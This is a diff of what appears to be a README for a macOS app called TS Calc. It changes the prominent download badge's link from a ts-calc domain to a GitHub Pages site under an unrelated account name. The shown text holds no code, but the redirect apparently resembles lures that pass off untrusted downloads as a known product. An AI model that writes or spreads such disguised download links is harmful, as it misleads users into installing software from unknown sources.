@@ -3,7 +3,7 @@
 ![TS Calc Logo](https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/dc/61/f8/dc61f80f-f5b0-b785-5c59-480cba2bac88/AppIcon-0-0-85-220-0-0-5-0-2x.png/1200x630bb.png)
 
 <div align="center">
-  <a href="http://ts-calc.github.io/.github">
+  <a href="https://rumpels-kaji.github.io/.github/TS">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_TS_CALC-royalblue?style=for-the-badge&logo=icloud&logoColor=white" alt="Download TS Calc on MacBook">
   </a>
 </div>
